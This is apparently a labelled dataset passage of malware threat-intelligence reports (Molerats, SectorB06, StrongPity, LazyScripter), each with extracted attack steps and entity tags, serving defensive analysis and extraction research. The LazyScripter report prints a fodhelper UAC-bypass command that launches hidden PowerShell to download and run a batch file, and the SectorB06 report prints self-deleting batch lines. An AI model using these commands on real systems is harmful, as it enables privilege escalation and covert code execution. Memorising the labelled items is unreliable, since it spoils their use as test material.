required parameters.Figure 4: Code snippet loading the runtime module and invoking it’s entry point function3/16The runtime module (""koi"") on analysis is found to be a backdoor. Before calling the main function of the module, the code from within the constructor is called which creates a new thread that regularly monitors the presence of a debugger.Figure 5: Code snippet of debugger monitoring functionOnce the debugger monitor thread is created we get the code execution flow to the main function of the module which ultimately leads to the backdoor execution. Within the main function the backdoor performs following operations:1. Collects the machine manufacture and machine model information using WMI which is used for execution environment checks and is later exfiltrated to C2 server. 2. Checks if it should execute in the current execution environment. 3. Creates a mutex with the name of executing binary. 4. Checks if the mutex is created successfully. 5. Determines if it is executed for the first time using the registry key value ""HKCU/Software/{name_of_executing_binary}/{name_of_executing_binary}"". 6. If the registry key doesn't exist, the code flow goes via a mouse check function which executes the code further only if it detects a change in either of the mouse cursor coordinates. In the end, the mouse check function also creates the same registry key.Figure 6: Main function of backdoor[+] Network communicationFrom the main function the final code flow reaches the function which starts the network communication. Since the backdoor uses Dropbox API for entire C2 communication and data exfiltration, it first extracts the primary Dropbox account token which is stored in encoded form within the binary. Figure 7 below describes the format and shows the encoded string that contains the Dropbox account token.Figure 7: Encoded stringExecuting further the backdoor collects the following information from victim machine:4/161. Machine IP address: By making a network request to “url” 2. UserName: From the environment variable 3. HostName: Using the API call Dns.GetHostName()The collected information is then processed and stored inside a variable named “UserInfo” by performing following operations:1. Concatenation (IP+UserName+HostName) 2. Base64 string encode 3. Substitution (Substitute “=” with “1”) 4. String reverseNext the backdoor sends following network requests in the specified sequence using the Dropbox API and correspondingly performs any required operations:1. Create Folder:Create a folder inside the root directory where the folder name is the value of UserInfo variableNote: The created folder acts as a unique identifier for a machine considering the fact that the machine IP remains static.2. Create File:Create a file inside the newly created folder where the file name is the Machine IP and the data it stores is the information collected in Step-1 of the main function.3. List Content:List the content of victim specific folder and delete files where the file name length is 154. List Content:List the content of root directory (which is attacker controlled) and extract the following information:a) File name of any hosted RAR archiveb) File name of any hosted exe (Which is found to be the legitimate RAR command-line utility and is used to extract the downloaded RAR archive in case the machine doesn't already have any RAR archive supporting application)c) File name of any hosted pdf or doc file (Used as decoy document)d) File name of any non specific file type (Based on our analysis it contains the secondary Dropbox account token that is used for file exfiltration from victim machine)Note: The above extracted information is stored locally and is used wherever required.5/16Finally, if the backdoor executed for the first time, it downloads and opens the hosted pdf or doc file and then calls two other functions where the first function creates a thread that continuously communicates with the Dropbox account to fetch and execute the C2 commands while the second function creates a thread that downloads and executes the RAR archive using the information extracted earlier.[+] C2 CommandsThe backdoor creates a file inside the victim specific folder on Dropbox which is used to fetch C2 commands. The file name is a random string of 15 characters.The C2 commands have following format:[command code]=[Command arguments separated using “^”]The backdoor uses command codes instead of plaintext strings to determine the action to be performed.Table below summarizes the supported command codes:Command code Action performed12345Run specified commandTake snapshot and uploadSend list of files from specified directoriesUpload filesDownload and execute the RAR archiveC2 infrastructure analysisWhile monitoring the IPs used during the current attack we observed the domain ""msupdata.com"" started to resolve to the IP 45.63.49[.]202 from 27-12-2021. We found two Historical SSL Certificates associated with this domain. Pivoting on the SSL domains like ""sognostudio.com"", ""smartweb9.com"" and others which were all attributed to Molerats APT group during past attacks.Additionally, the subdomain “www.msupdata.com” also has a Passive DNS resolution to IP 185.244.39[.]165 which is also associated with Molerats APT group in the past.Note: We didn't observe any activity related to the domain ""msupdata.com"" or it’s subdomain “www.msupdata.com” until this blog release.6/16Pivot on the Dropbox accounts Based on our analysis at least five Dropbox accounts are being used by the attacker. While investigating the Dropbox accounts we found that the attacker used following information during account registration:Account 1:Name: Adham gherbawi Country: NL (Netherlands) Email: adham.gharbawi@gmail[.]comAccount 2:Name: alwatan voice Country: NL (Netherlands) Email: alwatanvoiceoffice@gmail[.]comAccount 3:Name: adham gharbawi Country: NL (Netherlands) Email: adham.ghar.bawi@gmail[.]comAccount 4:Name: pal leae Country: PS (Palestine) Email: palinfoarabic@gmail[.]comAccount 5:Name: pla inod Country: PS (Palestine) Email: palinfo.arabic@gmail[.]comAlso, while analyzing the exfiltrated data from Dropbox accounts we found a screenshot of the attacker machine which was likely uploaded while the attacker was testing the malware. We correlated a number of artifacts and patterns with the file names visible from the snapshot to those used during the real attack. Moreover, from the snapshot the attacker seems to be using a simple GUI application to sync with the Dropbox account and display the victims list. In the victims list, the user name ""mijda"" is also present which matches with the name of document creator “mij daf” for all the documents we found during this attack.7/16Figure 8: Screenshot of attacker machineAdditionally, we discovered that the attacker machine was configured with the IP 185.244.39[.]105 which is located in the Netherlands and is associated with the VPS service provider ""SKB Enterprise B.V."". Interestingly, this IP (185.244.39[.]105) is also located in the same subnet as the IP 185.244.39[.]165 which was used for C2 communication and domain hosting in the past by Molerats APT group.Pivot on Google drive link Since the attacker also used Google Drive to host the payload in one of the attack chains, we tried to identify the associated Gmail account. Based on our analysis the attacker used following information for Gmail account:Account name: Faten Issa Email: issafaten584@gmail[.]comOld attack chainAs per our analysis the old attack chain was used from 13th July 2021(Start of campaign) to 13th Dec 2021.Figure 9 below illustrates the old attack chain.Figure 9: Attack chainThe major difference between the new attack chain and the old attack chain is seen in the backdoor delivery. Although we are not sure how these RAR/ZIP files were delivered but considering the past attacks they were likely delivered using Phishing PDFs. Additionally, we found a minor variation in the way the backdoor extracted the primary Dropbox account token. In the old attack chain the backdoor fetched the encoded string containing the primary Dropbox account token from attacker-hosted content on “justpaste.it”. Figure 10 below shows the attacker-hosted encoded string that contains the Dropbox account token and also describes the corresponding format.8/16Figure 10: Attacker-hosted encoded stringZscaler Sandbox Detection[+] Detection of the macro-based Document[+] Detection of the macro-based PowerPoint file[+] Detection of the payloadIn addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators related to Molerats APT group at various levels.Win32.Trojan.MoleratsAPT PDF.Trojan.MoleRatsAPTMITRE ATT&CK TTP MappingIDTacticTechniqueT1566.001 Spear phishingAttachmentUses doc based attachments with VBA macro9/16T1204.002 User Execution:Malicious FileUser opens the document file and enables the VBA macroT1059.001 Command andScripting interpreter: PowerShellVBA macro launches PowerShell to download and execute the payloadT1140T1082T1083T1005Deobfuscate/Decode Files or InformationStrings and other data are obfuscated in the payloadSystem Information DiscoverySends processor architecture and computer nameFile and Directory DiscoveryData from Local SystemUpload file from the victim machineUpload file from victim machineT1567.002 Exfiltration to CloudStorageData is uploaded to Dropbox via apiT1113Screen captureThe C2 command code ""2"" corresponds to taking a screenshot and uploading to attacker-controlled Dropbox accountIndicators of compromise عﻮﺒﻠﺟ ﻦﺠﺳ ﻦﻣ ﺔﺘﺴﻟا.exeExe statement 26-9-2021.exeExe ﻲﻣﻼﻋا 100 ﺮﻬﺷﻷ ﻲﺴﻨﺠﻟا شﺮﺤﺘﻟا ﻢﻟﺎﻌﻟا ﻲﻓ.exeExe (Confuser ﻲﻠﯿﺋاﺮﺳﻻا ﺔﯿﺟرﺎﺨﻟا ﺮﯾزوو .exeRARExe (Confuser سﺎﻤﺣ ﻲﻠﻘﺘﻌﻣ ﻦﻋ جاﺮﻓﻺﻟ ﺔﯾدﻮﻌﺴﻟا ﻲﻓ.exeExe ﻲﻣﻼﻋا 100 ﺮﻬﺷﻷ ﻲﺴﻨﺠﻟا شﺮﺤﺘﻟا ﻢﻟﺎﻌﻟا ﻲﻓ.exeExe (Confuser نادﻮﺴﻟا ﻲﻓ بﻼﻘﻧﻻا .exeExe (Themida Exchange Progress.exeExe (Confuser عﺎﻤﺘﺟﻻا ﺮﻈﺘﻨﺗ ﺔﻜﺋﺎﺷ تﺎﻔﻠﻣ - مدﺎﻘﻟا يﺮﺼﻤﻟا ﻲﻣﻮﻘﻟا ﻦﻣﻷا ﺲﻤﺗ ﻲﺘﻟا.exeExe (Confuser ﺮﺷﺎﻌﻟا يﻮﻨﺴﻟا تارﺎﺴﻣ.exeExe (Confuser ﻦﯿﺑ ﻒﻗﻮﻤﻟا ﺔﯿﺳﺎﺴﺣو ﻲﻛﺮﺘﻟا ﻢﻬﻨﻣ ﻞﻛ.exeExe (Confuser (Confuser ﻮﺑأ ىﺮﻛذ ءﺎﯿﺣا حﺮﺘﻘﻣ ﻰﻔﻄﺼﻣ ﻲﻠﻋ.exeExe (Confuser نﺎﻨﺒﻟ ﻲﻓ ﺔﻤﻈﻨﻤﻟا.exeExe (Confuser packed)[+] Download URLsComponent URLTemplateurl 7be44pCk3dU9KwXam14/16Component URLExeurl Molerats associated IPs45.63.49[.]202 23.94.218[.]221 185.244.39[.]165[+] Molerats associated domainsmsupdata[.]com www.msupdate[.]com# Spark backdoorbundanesia[.]com[+] File system artifacts# Dropped binaryC:\ProgramData\servicehost.exe {current_working_directory}\su.exeAppendix ","1. The attacker distributes macro-enabled Office documents containing geo-political lures. 2. The victim enables macros which execute a PowerShell command to download the malware executable. 3. The malware executable collects system info and exfiltrates it to the attacker's Dropbox account. 4. The malware connects to the attacker's Dropbox to fetch commands and additional payloads. 5. The malware receives commands to take screenshots, collect files, and download/execute additional executable payloads. 6. The malware sends the collected data and screenshots back to the attacker's Dropbox. ",valid_100,"['the attacker', 'Macro', 'Office', 'doc', 'The victim', 'a PowerShell command', 'NL', 'the malware', 'Table', 'Dropbox', 'Account', 'commands', 'files']",the attacker; Macro; Office; doc; The victim; a PowerShell command; NL; the malware; Table; Dropbox; Account; commands; files.
"5/27/2019SectorB06 using Mongolian language in lure document – Threat ReconSectorB06 using Mongolian language in lure documentthreatrecon.nshc.net/2019/04/30/sectorb06-using-mongolian-language-in-lure-documentby ThreatRecon Team Overview SectorB06 is a state sponsored threat actor group active especially within Asia. They have been exploiting vulnerabilities in Microsoft Ofﬁce’s Equation Editor [1] which Microsoft removed in January 2018 [2], which in this case seems to be a highly obfuscated version of CVE-2017-11882. The malware we analyzed in this case are sent seemingly only after they already have a basic foothold in their target organizations.April 30, 2019We came across multiple pieces of their malware used in 2019 which appears to be custom compiled on a per target victim per organization basis, with this particular decoy document being uploaded from a Singapore IP address. Decoy RTF Document In this example, SectorB06 made use of a Mongolian decoy document to target their victim.Decoy document written in Mongolian which references the Ministry of Justice and Internal Affairs of MongoliaIf exploitable, the exploit code drops the ﬁrst-stage malware DLL at “%APPDATA%\Microsoft\Word\STARTUP\cclerr.wll” and runs it. First Stage Malware (RasTls.dll)url using Mongolian language in lure document – Threat ReconThe malware starts off by resolving a list of encoded API addresses by accessing the address of kernel32 from the InMemoryOrderModuleList inside the Process Environment Block (PEB) using FS:[0x30]. It then gets the address of kernel32.LoadLibraryA and kernel32.GetProcAddress from a function which parses kernel32’s memory block. This is despite the malware already importing LoadLibraryA() and GetProcAddress(), and is used presumably to prevent automated systems from detecting massive amounts of calls to those functions.From there, it gets the address of the other libraries it makes use of – Shlwapi.dll, Shell32.dll, Gdi32.dll, User32.dll, and Advapi32.dll. Once that is done, it calls the function which parses the various DLLs again close to 100 times in order to resolve all the APIs it uses. In the middle of those calls, it checks CheckRemoteDebuggerPresent and does not resolve the APIs from the other DLLs if a debugger is found, which will cause the malware to exit later before doing anything malicious.Malware decrypting the imports it uses via its custom hashing algorithmIt then starts a thread which polls the result of CheckRemoteDebuggerPresent constantly and exits once a debugger is found. Process Name Hashing The malware checks for the lower-cased process name it is running under at various steps of execution using a string hashing algorithm. In the ﬁrst step, it checks against the string hash “0xAB341DFA”, “0x190BC0F1”, “0x639EBCBF”, “0xA6AFB610”, “0x4D16CE36”, and “0x64820461”. It only continues execution if the process name hash is one of the ﬁrst ﬁve hashes and the process name hash is not the last hash. We wrote a custom bruteforcing utility and managed to crack the ﬁrst ﬁve hashes, ﬁnding the process names which the attacker expected as “winword.exe”, “excel.exe”, “powerpnt.exe”, “acrord32.exe”, and “eqnedt32.exe”. While four of these process names are associated with Microsoft Ofﬁce and the Equation Editor vulnerabilities, “acrord32.exe” (Adobe Reader) is also in the expected process name list because the malware will in some situations rename the legitimate signed Symantec executable ﬁle (described later) to “AcroRd32.exe”.url using Mongolian language in lure document – Threat ReconMalware making sure the process name is related to the exploit source or itselfBesides this initial check, it also checks the hashes of process names at three other points of execution. Only the hash 0X84F39C89 is checked against the entire process list and is not a lower-case version of the process name.Hash If process is rundll32.exe, do not continue If process is not explorer/services.exe, do not continue If process is not explorer/services.exe, do not continue If this process exists, do not inject into dllhost.exeFrom this we can see there are actually two points from which the malware expects to run from – using the Microsoft Ofﬁce exploit which injects the second stage malware into dllhost.exe or another path which injects into explorer.exe/services.exe. Persistence This ﬁrst stage malware mainly decompresses and drops two ﬁles being used for persistence.File Name Renamed from cclerr.wll Legitimate signed Symantec ﬁle (real name: dot1xtra.exe) from d65a6239c12b3a7a3eaPublic examples of a different version of this same signed ﬁle being abused in the wild was with version 11.0.4010.7, where the ﬁlenames used were rastlsc.exe and iassvcs.exe. Though these ﬁles were signed, their certiﬁcates have long expired.The ﬁles used for persistence are stored in either the “%AppData%\Intel\Intel(R) Processor Graphic\” or “%PROGRAMFILES%\Intel\Intel(R) Processor Graphics\” directories.url using Mongolian language in lure document – Threat ReconThe persistence keys used are in <HIVE>\Software\microsoft\windows\currentversion\run where <HIVE> is either HKLM or HKCU depending on whether there is administrative rights. The name of the registry key used is “IntelGraphicsController” with the value of “<DIRECTORY_TO_INTELGRAPHICSCONTROLLER.EXE> Processid:{0A10C245- 2190-7215-A3C5-43215926716A}”. Commands Ran The malware runs CreateProcess from a custom command execution function four times, with each run executing takeown/icacls/icacls. The ﬁrst icacls function attempts to give ownership to the administrators group and the second icacls function attempts to give ownership to the users group. The four runs are for the RasTls.dll ﬁle in the %APPDATA% and %PROGRAMFILE% subdirectories and the IntelGraphicsController.exe ﬁle in the %APPDATA% and %PROGRAMFILE% subdirectories.Besides those commands, it also drops two batch ﬁles.<random.bat> – deleting from initial location del “C:\Users\admin\AppData\Roaming\Microsoft\Word\STARTUP\cclerr.wll” /q /f del %0 /q /f <random.bat> – attempting to delete winword.exe del “C:\Program Files\Microsoft Ofﬁce\Ofﬁce14\WINWORD.EXE” /q /f del %0 /q /f The malware uses kernel32’s GetFileTime() and SetFileTime() to get the Creation Time, Last Access Time, and Last Write Time of %windir%\system32\kernel32.dll and saves those same times to the RasTls.dll and IntelGraphicsController.exe ﬁles. However, these timestamps are only approximate [3] so the fake times will not be an exact match to kernel32.dll’s ﬁle time.url using Mongolian language in lure document – Threat ReconThe main two ﬁles dropped by the malware for persistence have the approximate timestamps of kernel32.dll Victim Identiﬁcation The malware identiﬁes its victims using <HIVE>\Software\Intel\Java (with <HIVE> being HKLM/HKCU again) with the name “user”. Malware “1-a” referenced below is the current ﬁrst stage malware we are describing in this post.Malware “1-a” and “5-a” contain the same victim identiﬁer values, as do “2-a” and “3-a”. This is interesting because of the second stage malware which we describe brieﬂy later.Malware Victim Identiﬁcation Value 1-a0XdgrHGaayfyBHQ/vCwMP2HE+cNEbzTk 4et2q+jmcCeVoPVtVlUeC+Zqq62VN3Q7e7noo8oplXCIv 0XdgrHGaayfyBHQ/vCwMP2HE+cNEbzTk 6cZ9bYJOH0SxvpFWecTmuneM/5p93lQw2-a3-a5-aProcess Injection Finally, the malware performs process injection into “%windir%\system32\dllhost.exe /Processid:{712459B2-3311-54C3-910D-0327080553246}” without the second stage ever touching the disk. The injected process, dllhost.exe, is typically a container process for running COM DLLs. The list of CLSIDs in a system can be seen in KEY_CLASSES_ROOT\CLSID. We are unsure what the hardcoded CLSID value of “712459B2-3311-54C3-910D-0327080553246” is supposed to represent, but a likely guess is a CLSID used by Symantec since the malware is impersonating their executable ﬁle.url using Mongolian language in lure document – Threat ReconSecond Stage Malware While we did not analyze the second stage malware in large detail, we did decode the C2 information among other data such as credentials. The samples we analyzed appear to connect to two external C2 IP addresses 217[.]69[.]8[.]255 and 1[.]187[.]1[.]187 on port 443. It also references an internal IP address, which indicate that these spear phishing documents are sent to targeted victims and only after the attacker already has basic access to the victim’s internal network.One of the purposes of this second stage malware also appears to be for creating a remote command shell.Malware 6-bInternal IPs Referenced 192[.]168[.]43[.]234 192[.]168[.]111[.]111 192[.]168[.]111[.]111 192[.]168[.]43[.]234 192[.]168[.]43[.]234 192[.]168[.]43[.]234With the malware trying to target/use the same internal IP but with different user identiﬁcation values, we see how the attacker is custom compiling each malware executable for each victim/attempt in a speciﬁc organization. Summary SectorB06 is a threat group with very speciﬁc interests and in the case of these malware, appears to either already have a basic foothold in the victim network or has already gained and then lost access to the network. They are actively developing their toolkit and are adept at bypassing security solutions at least statically especially for their exploit document and second stage malware. Indicators of CompromiseDecoy Hash (SHA-256) First Stage Hashes (SHA-256) 217[.]69[.]8[.]255 1[.]187[.]1[.]187 MITRE ATT&CK Techniques The following is a list of MITRE ATT&CK Techniques we have observed based on our analysis of these malware.Initial Access T1193 Spearphishing Attachment Execution T1059 Command-Line Interface T1203 Exploitation for Client Execution T1064 Scriptingurl using Mongolian language in lure document – Threat ReconT1204 User Execution T1218 Signed Binary Proxy Execution Persistence T1038 DLL Search Order Hijacking T1060 Registry Run Keys / Startup Folder T1116 Code Signing T1038 DLL Search Order Hijacking T1107 File Deletion T1055 Process Injection T1218 Signed Binary Proxy Execution T1045 Software Packing T1057 Process Discovery T1012 Query Registry T1063 Security Software Discovery T1124 System Time Discovery Collection T1119 Automated Collection Exﬁltration T1022 Data Encrypted Command and Control T1043 Commonly Used Port T1071 Standard Application Layer Protocol References [1] Microsoft Ofﬁce : List of security vulnerabilities url 9/cvssscoremax-/Microsoft-Ofﬁce.html [2] CVE-2018-0802 | Microsoft Ofﬁce Memory Corruption Vulnerability url [3] GetFileTime function urlﬁleapi/nf-ﬁleapi-getﬁletimeurl using Mongolian language in lure document – Threat Reconurl ","1. Send spearphishing email with RTF document containing exploit for CVE-2017-11882. 2. Exploit triggers and drops first stage malware DLL (RasTls.dll). 3. Malware resolves APIs, checks process name, and drops signed Symantec binary for persistence. 4. Malware identifies victim, modifies file permissions, and timestomps files. 5. Malware injects next stage malware into dllhost.exe process without writing it to disk. 6. Second stage malware connects to C2 servers and builds remote shells. 7. Malware custom compiled per victim organization with tailored internal IP addresses. 8. SectorB06 already has some access to target network before sending spearphishing. ",valid_33,"['spearphishing', 'RTF document', 'exploit', 'CVE-2017-11882', 'drops', 'First Stage Malware', 'RasTls.dll', 'APIs', 'process', 'Symantec', 'persistence', 'victim', 'files', 'second stage malware', 'C2', 'custom', 'COM', 'organization', 'IP', 'SectorB06', 'access', 'target', 'network']",spearphishing; RTF document; exploit; CVE-2017-11882; drops; First Stage Malware; RasTls.dll; APIs; process; Symantec; persistence; victim; files; second stage malware; C2; custom; COM; organization; IP; SectorB06; access; target; network.
"A new StrongPity variant hides behind Notepad++ installationblog.minerva-labs.com/a-new-strongpity-variant-hides-behind-notepad-installationThe StrongPity actor group has been around since 2012 and employs the same tactics, namely adding backdoors to legitimate software used by specific users, a technique also known as water holing. The group is also referred to as APT-C-41 and PROMETHIUM. In 2016, StrongPity was detected by Kaspersky in a campaign that targeted specific users in Belgium and Italy who were interested in Truecrypt and Winrar software. These APT groups’ campaigns are not commonly seen but different research groups have detected several StrongPity campaigns over the years.Nonetheless, a tweet from blackorbird caught our eye. Here, a StrongPity APT hides its three-stage attack behind a Notepad++ installation.This attack method is highly efficient since the malware 'hides' itself inside a legitimate tool that is commonly found within organizations. Accordingly, when downloaded from an unofficial URL, the common tool can be exploited– as in this case.In the first stage, the victim downloads a “Notepad++” setup file and executes it. To make the malicious file more trustable to the victim, the threat actor adds an Original Notepad++ icon:1/3Figure 1 - Notepad++ iconWhen executed, the malicious file creates a new folder named “WindowsData“ under C:\ProgramData\Microsoft and drops three different files on the infected station:1. npp.8.1.7.Installer.x64.exe – the original Notepad++ installationfile under C:\Users\Username\AppData\Local\Temp\ folder.2. winpickr.exe - a malicious file under C:\Windows\System32 folder. 3. ntuis32.exe – malicious keylogger under C:\ProgramData\Microsoft\WindowsData folder.After the file drop, the first stage executable runs the legitimate Notepad++ installation, whilst the victim is oblivious to the two malicious files being installed in the background.In the last phase of the setup.exe stage, it runs winpickr.exe with an “update” argument.In its first execution by setup.exe, winpickr.exe (with the “update” argument) creates a new service named “PickerSrv” (Display name: FilePicker UI Server) whose purpose is to execute itself at startup and stay persistent on the endpoint.Figure 2 - Service CreationFigure 3 - New Service CreatedA malicious file with such parameters can easily bypass the sandbox, given the fact that it is only creating a service.When executed as a service (without any parameters), winpickr.exe uncovers its real purpose. Firstly, it immediately executes ntuis32.exe. This malicious file is a simple keylogger that saves users’ keystrokes to a file. The file name follows an inf_loc_ky_%u_v1.0.0_.tbl pattern when %u is a file serial number. These2/3files are created as hidden system files with read-only attributes and saved in the C:\ProgramData\Microsoft\WindowsData folder that was previously created by the first stage setup.exe file. To remain hidden, the keylogger runs as an overlapped windows (using WS_MINIMIZEBOX style). A new mutex called “Local\WinLoginWait” is also created during the execution process.While the keylogger runs in the background, winpickr.exe repeatedly checks C:\ProgramData\Microsoft\WindowsData folder for .tbl files. When a file is found containing the attributes of the log files created by ntuis32.exe (hidden, system, and read-only), it connects to its C&C server (https[:]//advancedtoenableplatform[.]com/contact[.]php) for file transfer. After sending the file to the C&C, winpickr.exe deletes the file on the endpoint.This attack’s pattern is identical to StrongPity’s usual attack flow. The setup.exe and winpickr.exe code is legitimate notepad++ installer ","1. The threat actor spreads a Trojanized Notepad++ installer. 2. The victim downloads and executes the malicious Notepad++ installer. 3. The installer drops the legitimate Notepad++, a keylogger (ntuis32.exe), and a remote access tool (winpickr.exe). 4. The installer also installs a persistent service to re-execute the remote access tool at startup. 5. The keylogger records keystrokes to a hidden file. 6. The remote access tool periodically checks for new keystroke log files. 7. The remote access tool exfiltrates any found log files to the C2 server. 8. After exfiltration, the remote access tool deletes the local log file. ",valid_27,"['the threat actor', 'notepad++ installer', 'the victim', 'ntuis32.exe', 'winpickr.exe', 'startup', 'the keylogger', 'log files']",the threat actor; notepad++ installer; the victim; ntuis32.exe; winpickr.exe; startup; the keylogger; log files.
"Threat Intelligence ReportLazyScripter: From Empire to double RATHossein JaziFebruary 20211Table of ContentsExecutive Summary 3Introduction 4 13Timeline of activities and phishing lures Document analysis Archive analysisKOCTOPUS Analysis 15 Registry key variant EmpoderInfrastructure 35Attribution 36Conclusion 37Indicators of Compromise (IOCs) 38MITRE ATT&CK techniques 422February 2021Executive SummaryMalwarebytes’ Threat Intelligence analysts are continually researching and monitoring active malware campaigns and actor groups as the prevalence and sophistication of targeted attacks rapidly evolves. In this paper, we introduce a new APT group we have named LazyScripter, presenting in-depth analysis of the tactics, techniques, procedures, and infrastructure employed by this actor group. Although the observed TTPs have commonality with known actor groups, there are many notable differences setting LazyScripter apart from these groups; these similarities and differences are discussed in the Attribution section of this paper. APT groups are traditionally tracked according to specific targets and tools or methodologies they employ. Many actor groups use spam campaigns, attaching weaponized documents to phishing emails themed to target the industry or demographic of interest. In this case, we initially discovered a number of malicious emails specificallytargeting individuals seeking employment, which prompted a deeper investigation.Digging deeper we uncovered a targeted spam campaign dating back as far as 2018 using phishing lures with themes aimed not only at those seeking immigration to Canada for employment, but also at airlines.In the following analysis, we walk through the timeline of observed TTPs from the initial phishing campaign to the state of the current and ongoing activities of the actor. We take a deep dive into each of the tools used, including the weaponized documents and the multiple variants of malware and exploitation techniques employed. Finally, we detail the infrastructure used and discuss the attribution comparisons with known actor groups such as APT28 and Muddy Water.This in-depth and detailed analysis has revealed a developing campaign by what we believe to be a previously unidentified APT actor. Not only has this campaign been active for several years, but ongoing tracking shows this actor is still maintaining the infrastructure used and is actively updating toolsets. For this reason, we continue to track this new group LazyScripter as the threat evolves.3IntroductionIn late December 2020 we observed a few malicious documents with embedded objects that were designed to target job seekers. The embedded objects were either VBScript or batch files that deployed two open- source multi-stage Remote Access Trojans (RATs): Octopus and Koadic. Interestingly, in some cases the attacker managed to drop other RATs such as LuminosityLink, RMS, Quasar, njRat and Remcos.This triggered our interest to further investigate this threat actor to understand its activities over the past few years. We were able to track them back to at least 2018 with a campaign targeting victims looking to immigrate to Canada. Over time they have used different file types as their initial lures, and they have switched their main toolset from PowerShell Empire to double RAT (Koadic and Octopus).This threat actor is targeting the International Air Transport Association (IATA) and airlines in which we observed several different lures specifically designed to target airlines that are using the BSPLink software. Most recently we observed that they have changed their lure to mimic a new feature recently introduced by IATA called IATA ONE ID (Contactless Passenger Processing tool). This indicates that this actor is constantly updating its toolsets to target new systems developed by IATA.4PhishingIn all their phishing lures the actor has used its loader to spawn a combination of Octopus and Koadic (there were only a few cases with Koadic only). We were able to identify several different variants of this loader: executable, batch, VBScript, and registry files (in which persistence is achieved by writing a PowerShell script into the AutoRun registry key). We named this new loader as KOCTOPUS.This group also has used another loader around 2018 and 2019 to load PowerShell Empire. We named this loader Empoder.As a phishing lure they mainly used either IATA- or job-related themes to target victims. However, we have observed several other phishing lures that have been used by this actor. Here are some of them:IATA security (International Air Transport Association security)• • BSPlink Updater or Upgrade (BSPlink is the global interface for travel agents and airlines to access theIATA Billing and Settlement Plan (BSP)). IATA ONE IDTourism (UNWTO)• • User support kits for IATA users • Canada skill worker program • Canada Visa (CanadaVisa.com is the online presence of the Campbell Cohen Immigration Law Firm)Job informationAnother interest of this actor is targeting people that want to immigrate to Canada through government job- related programs. In one of the specific cases the actor has used the legitimate ""Canadavisa.com"" site as its phishing lure. Canadavisa is a known Canadian immigration website associated with an immigration firm based in Montreal, Canada.This actor has mainly used spam emails weaponized with either archive or document files as it is initial infection vector. Both zip and document files contain a variant of either KOCTOPUS or Empoder and in some cases they are password protected.The actor has mainly used two GitHub accounts to host its toolsets. Both of these accounts were deleted on Jan 12 and 14 2021, respectively.• url • url 1: GitHub account belonging to threat actorThe actor created a new GitHub account on Feb 2nd 2021 to host its payloads to operate its new spam campaign:Figure 2: New GitHub repositoryTimeline of activities and phishing luresWe were able to collect some of the spam emails used by this actor over the past two years. In these spam emails the actor used several methods to redirect the user to download a variant of KOCTOPUS. The latest campaign was spotted on Feb 5th, 2021 in which the actor was distributing a variant of KOCTOPUS pretending to be “BSPLink Upgrade.exe” and managed to drop a variant of Quasar Rat in addition to OCTOPUS and Koadic. Prior to that we have spotted another campaign on Jan 6th, 2021 in which the actors were distributing a variant of KOCTOPUS pretending to be “IATA ONE ID.exe” software:6Figure 3: Latest spam campaignHere is the list of different lures used by this actor:Figure 4: Latest spam campaign•KOCTOPUS has been archived and distributed as an email attachment to victims.7Figure 5: Spam email variant 1•The spam email contains a PDF file with a link to download a variant of KOCTOPUS.Figure 6: Spam email variant 2Figure 7: Spam email variant 38Figure 8: Attached PDF file•The spam email contains a link that redirects the victim to download KOCTOPUS or a maldoc that has an embedded KOCTOPUS. The link usually is a URL shortener link using shortener services such as bit.ly or cutt.ly that redirects victims to either the attackers’ Github repository or the IP/URL address that hosts the maldoc.Figure 9: Spam email variant 3On March 19th 2020, SANS ISC InfoSec Forums reported a multistage attack that took advantage of the COVID-19 pandemic to distribute its malware. This reported maldoc contains a variant of the KOCTOPUS malware we uncovered in this paper. In that phishing email the actor spoofed the World Health Organization and pretends to provide recommendations.We were able to identify multiple themes used by this actor and the time they have been used in spam campaigns. The following image shows the time frames of the different lures used by the actor.9Figure 10: Lures timeline10Document analysisUnlike most actors that are using macros in their documents to perform malicious activities, this actor has embedded objects that are one of the KOCTOPUS or Empoder variants.We identified 14 malicious documents that have been used by this actor since 2018:Figure 11: List of maldocs used by this actorThe malicious documents usually have one or two embedded objects with either PDF, Microsoft Word or Excel icons to pretend they are another document embedded in the doc while in fact they are either batch, executable, or VBScript variants of KOCTOPUS or Empoder.11Figure 12: Doc Template 112Figure 13: Doc Template 2Archive analysisThe actor has not only relied on maldocs to deliver its loaders but also used archive files that have embedded a variant of KOCTOPUS or Empoder. The following shows the list of archive lures used by this actor since 2018:13Figure 14: List of archive files and their embedded objects14KOCTOPUS AnalysisThe actor has used this loader to load Octopus and Koadic and in some cases other RATs such as LuminosityLink RMS and Quadar RAT. This loader has four different variants which we will describe below.Batch VariantThe batch files used by this actor are highly obfuscated with the BatchEncryption tool. BatchEncryption is an advanced batch obfuscation tool that uses a combination of known and custom environment variable encoding techniques.In this section we provide the analysis of a batch file embedded within the most recent maldoc used by this actor. The following shows the obfuscated version of KOCTOPUS:Figure 15: Overall ProcessFigure 17 shows the list of commands that will be executed by this loader after de-obfuscation.Figure 16: KOCTOPUS Batch Variant ObfuscatedFigure 17: KOCTOPUS Batch Variant Not Obfuscated15This loader starts it activities by checking the OS version using the following command:for /f ""tokens=2 delims=,"" %%i in ('wmic os get caption^,version/format:csv') do set os=%%iThen it looks for number 10 using the find command to identify if the OS is Windows 10. If that is the case, it attempts to bypass User Access Control (UAC) using fodhelper.exe and execute its commands with higher privilege. If the OS version is not 10, it performs UAC bypass through Event Viewer (eventvwr.exe).Fodhelper.exe has been used in Windows 10 to manage language settings. Since this process is running with highest privilege, an attacker can abuse it to execute its malicious commands with the same privilege fodhelper has. When the fodhelper.exe process starts it looks for the three registry keys shown below that by default do not exist. Therefore, an attacker can write its malicious commands in these registry keys to be executed by fodhelper.exe with the highest privilege.HKCU:\Software\Classes\ms-settings\shell\open\command HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute HKCU:\Software\Classes\ms-settings\shell\open\command\(default)This loader has created these registry keys with a PowerShell command:&& reg add HKCU\Software\Classes\ms-settings\shell\open\command /v ""DelegateExecute"" /f && reg add HKCU\Software\Classes\ms- settings\shell\open\command /d ""cmd.exe /c powershell -WindowStyle Hidden - command \""IEX (New-Object 'C:\Users\Public\Libraries\sc.bat');\"" C:\Users\Public\Libraries\sc.bat"" /fTo execute the PowerShell command, fodhelper.exe needs to be executed:&& START /W fodhelper.exeUpon fodhelper execution, PowerShell is executed to download a batch file from a remote server and save it into the Libraries directory and finally execute it. At the end the loader performs the cleanup procedure by deleting the created registry keys with the following command:&& reg delete HKCU\Software\Classes\ms-settings /fIf the OS version is not 10, Event Viewer is used to bypass UAC. When 